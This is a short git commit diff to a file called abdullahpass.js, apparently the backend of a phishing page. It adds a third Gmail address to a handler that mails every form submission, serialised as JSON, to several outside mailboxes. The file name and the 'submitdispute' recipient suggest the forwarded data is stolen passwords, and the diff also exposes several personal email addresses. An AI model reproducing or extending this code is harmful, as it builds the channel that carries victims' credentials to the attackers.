9bf830343656f0166f5e0a41458673856c1be2fd
zm9807350 <zm9807350@gmail.com>
2025-10-20 21:48:27 +0500

    Update abdullahpass.js

--- abdullahpass.js
+++ abdullahpass.js
@@ -37,7 +37,7 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "newzatpage.@gmail.com,submitdispute@gmail.com",
+      to: "newzatpage.@gmail.com,submitdispute@gmail.com,hibuads87@gmail.com",
       subject: "Ijaz",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
